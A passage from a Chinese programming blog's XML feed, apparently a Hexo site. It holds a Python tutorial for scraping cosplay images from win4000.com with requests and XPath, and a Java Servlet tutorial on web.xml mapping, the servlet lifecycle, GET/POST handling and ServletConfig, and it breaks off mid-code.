        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬取美桌网cosplay图片</title>
      <link href="/posts/e434/"/>
      <url>/posts/e434/</url>
      
        <content type="html"><![CDATA[<p><strong>开发环境：</strong></p><p>①Python3.8.5</p><p>②Pycharm-community-2020.2</p><p>③GoogleChrome 84.0.4147.135 </p><p>④XPath Helper 2.0.2</p><p><strong>目标网址：</strong>【美桌网cosplay图片大全】<a href="http://www.win4000.com/meinvtag26_1.html">http://www.win4000.com/meinvtag26_1.html</a></p><p>可以看到这个cosplay大全一共有5页，我们需要将每页的每个相册里的所有图片都爬取下来。</p><p>整个爬取过程可以分为如下四步：1.分析网页性质2.发送网络请求3.解析数据（筛选数据）4.将数据保存至本地。</p><p><strong>实验过程：</strong></p><ul><li>打开目标网址后，我们发现url地址栏中下划线后面的数字表示这是该cosplay大全的第几页。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200929113954.png"></p><hr><ul><li>在浏览器中选中相册右键选择检查，可以看到该模块对应的前端代码，我们的目标就是获取黄色方框的url地址，也就是每个相册所在的网页地址。于是我们可以使用XPath插件通过标签去一步步定位，可以看到results结果集里有24条数据，刚好对应每页24个相册。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214939.png"></p><p>对应的xpath为：</p><p>&#x2F;&#x2F;div[@class&#x3D;”list_cont Left_list_cont  Left_list_cont2”]&#x2F;&#x2F;div[@class&#x3D;”tab_tj”]&#x2F;&#x2F;ul&#x2F;li&#x2F;a&#x2F;@href</p><hr><ul><li>进入相册后，我们发现url地址栏中下划线后面的数字表示这是该相册的第几张图片。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215034.png"></p><hr><ul><li>右键检查图片，data-original后面的url地址即是我们最终需要的图片地址，可通过该地址下载图片。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215035.png"></p><p>对应的xpath为：</p><p>&#x2F;&#x2F;div[@class&#x3D;”pic-meinv”]&#x2F;a&#x2F;img&#x2F;@data-original</p><hr><p><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> parsel</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># cosplay大全共有5页，使用拼接url访问每一页</span></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://www.win4000.com/meinvtag26_&#123;&#125;.html&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(page))</span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.get(url=url, headers=headers).text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用parsel的xpath解析获得每个相册所在的url地址集合，使用getall()方法</span></span><br><span class="line">    selector = parsel.Selector(response)</span><br><span class="line">    album_list = selector.xpath(<span class="string">&#x27;//div[@class=&quot;list_cont Left_list_cont  Left_list_cont2&quot;]//div[@class=&quot;tab_tj&quot;]//ul/li/a/@href&#x27;</span>).getall()</span><br><span class="line">    <span class="comment"># print(album_list)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每个相册十多张图片，使用拼接picture_url访问每一张图片的网页地址</span></span><br><span class="line">    <span class="keyword">for</span> album_url <span class="keyword">in</span> album_list:</span><br><span class="line">        <span class="comment"># 每个相册的图片不超过20张</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            picture_url = album_url.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.&#x27;</span> + album_url.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>] + <span class="string">&#x27;.&#x27;</span> + album_url.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">2</span>] + <span class="string">&#x27;_&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;.&#x27;</span> + album_url.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">3</span>]</span><br><span class="line">            response_2 = requests.get(url=picture_url, headers=headers).text</span><br><span class="line">            selector_2 = parsel.Selector(response_2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获得每张图片的下载地址，使用get()</span></span><br><span class="line">            imgPath = selector_2.xpath(<span class="string">&#x27;//div[@class=&quot;pic-meinv&quot;]/a/img/@data-original&#x27;</span>).get()</span><br><span class="line">            <span class="comment"># print(imgPath)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 拼接的picture_url可能不存在该页面，解析获得的imgPath可能为null</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> imgPath <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># content是获取二进制文本数据</span></span><br><span class="line">                img_data = requests.get(url=imgPath, headers=headers).content</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 按时间命名图片，保正图片按相册排序</span></span><br><span class="line">                file_name = datetime.now().strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>) + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">                <span class="comment"># file_name = img_url.split(&#x27;/&#x27;)[-1]</span></span><br><span class="line">                <span class="comment"># print(file_name)</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;img\\&quot;</span> + file_name, mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(img_data)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;保存完成：&quot;</span> + file_name)</span><br><span class="line">                <span class="comment"># 阻塞1s，防止图片名重复导致覆盖了图片</span></span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><hr><p><strong>运行结果：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214940.png"></p>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet</title>
      <link href="/posts/d9a3/"/>
      <url>/posts/d9a3/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet技术"><a href="#Servlet技术" class="headerlink" title="Servlet技术"></a>Servlet技术</h1><h2 id="什么是Servlet"><a href="#什么是Servlet" class="headerlink" title="什么是Servlet"></a>什么是<strong>Servlet</strong></h2><ol><li><p>Servlet 是 JavaEE 规范之一。规范就是接口 </p></li><li><p>Servlet 就 JavaWeb 三大组件之一。三大组件分别是：Servlet 程序、Filter 过滤器、Listener 监听器。 </p></li><li><p>Servlet 是运行在服务器上的一个 java 程序，它可以接收客户端发送过来的请求，并响应数据给客户端。</p></li></ol><h2 id="手动实现-Servlet-程序"><a href="#手动实现-Servlet-程序" class="headerlink" title="手动实现 Servlet 程序"></a>手动实现 Servlet 程序</h2><ul><li>IDEA中创建项目</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200922132609.png"></p><ul><li>编写一个类去实现 Servlet 接口并实现 service 方法，用来处理请求和响应数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//service方法是专门用来处理请求和响应的</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloServlet 被访问了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>到 web.xml 中去配置 servlet 程序的访问地址</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- servlet标签给Tomcat配置Servlet程序 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--servlet-name标签 Servlet程序起一个别名（一般是类名） --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--servlet-class是Servlet程序的全类名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.nanzx.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--servlet-mapping标签给servlet程序配置访问地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--servlet-name标签的作用是告诉服务器，我当前配置的地址给哪个Servlet程序使用--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">         url-pattern标签配置访问地址</span></span><br><span class="line"><span class="comment">            / 斜杠在服务器解析的时候，表示地址为：http://ip:port/工程路径</span></span><br><span class="line"><span class="comment">            /hello 表示地址为：http://ip:port/工程路径/hello</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>工程路径：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200922135054.png"></p><ul><li>启动Tomcat Server服务，在浏览器中访问：<a href="http://localhost:8080/servlet/hello%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%EF%BC%9AHelloServlet">http://localhost:8080/servlet/hello，可以看到控制台输出：HelloServlet</a> 被访问了</li></ul><h2 id="url-地址到-Servlet-程序的访问"><a href="#url-地址到-Servlet-程序的访问" class="headerlink" title="url 地址到 Servlet 程序的访问"></a>url 地址到 Servlet 程序的访问</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200922145404.png"></p><h2 id="Servlet-的生命周期"><a href="#Servlet-的生命周期" class="headerlink" title="Servlet 的生命周期"></a>Servlet 的生命周期</h2><ol><li><p>执行 Servlet 构造器方法 。是在<strong>第一次访问</strong>的时候创建 Servlet 程序会调用。 </p></li><li><p>执行 init 初始化方法。是在<strong>第一次访问</strong>的时候创建 Servlet 程序会调用。 </p></li><li><p>执行 service 方法 。每次访问都会调用。 </p></li><li><p>执行 destroy 销毁方法 。在 web 工程停止的时候调用。</p></li></ol><h2 id="GET-和-POST-请求的分发处理"><a href="#GET-和-POST-请求的分发处理" class="headerlink" title="GET 和 POST 请求的分发处理"></a><strong>GET</strong> <strong>和</strong> <strong>POST</strong> <strong>请求的分发处理</strong></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/servlet/hello&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//service方法是专门用来处理请求和响应的</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloServlet 被访问了&quot;</span>);</span><br><span class="line">        <span class="comment">// 类型转换（因为它有 getMethod()方法） </span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="comment">// 获取请求的方式 </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> httpServletRequest.getMethod();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;GET&quot;</span>.equals(method)) &#123;</span><br><span class="line">            doGet();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span></span><br><span class="line">        (<span class="string">&quot;POST&quot;</span>.equals(method)) &#123;</span><br><span class="line">            doPost();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;post 请求&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get 请求&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过继承HttpServlet实现Servlet程序"><a href="#通过继承HttpServlet实现Servlet程序" class="headerlink" title="通过继承HttpServlet实现Servlet程序"></a>通过继承HttpServlet实现Servlet程序</h2><p>一般在实际项目开发中，都是使用继承 HttpServlet 类的方式去实现 Servlet 程序。 </p><ol><li><p>编写一个类去继承 HttpServlet 类 </p></li><li><p>根据业务需要重写 doGet 或 doPost 方法 </p></li><li><p>到 web.xml 中的配置 Servlet 程序的访问地址</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet2</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloServlet2的doGet方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;HelloServlet2的doPost方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用-IDEA-创建-Servlet-程序"><a href="#使用-IDEA-创建-Servlet-程序" class="headerlink" title="使用 IDEA 创建 Servlet 程序"></a>使用 IDEA 创建 Servlet 程序</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200922235424.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200922235740.png"></p><p><code>最后在web.xml中配置&lt;servlet-mapping&gt;</code></p><h2 id="Servlet-类的继承体系"><a href="#Servlet-类的继承体系" class="headerlink" title="Servlet 类的继承体系"></a><strong>Servlet</strong> <strong>类的继承体系</strong></h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200923140122.png"></p><h1 id="ServletConfig-类"><a href="#ServletConfig-类" class="headerlink" title="ServletConfig 类"></a>ServletConfig 类</h1><ul><li><p>ServletConfig 类是 Servlet 程序的<strong>配置信息类</strong>。 </p></li><li><p>Servlet 程序和 ServletConfig 对象都是由 Tomcat 负责创建，我们负责使用。 </p></li><li><p>Servlet 程序默认是第一次访问的时候创建，ServletConfig 是每个 Servlet 程序创建时，就创建一个对应的 ServletConfig 对象。</p></li></ul><p><strong>ServletConfig</strong> <strong>类的三大作用</strong> </p><ol><li><p>可以获取 Servlet 程序的别名 servlet-name 的值 </p></li><li><p>获取初始化参数 init-param </p></li><li><p>获取 ServletContext 对象</p></li></ol><hr><p>web.xml 中的配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.nanzx.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>user<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>root<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>password<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Servlet 中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 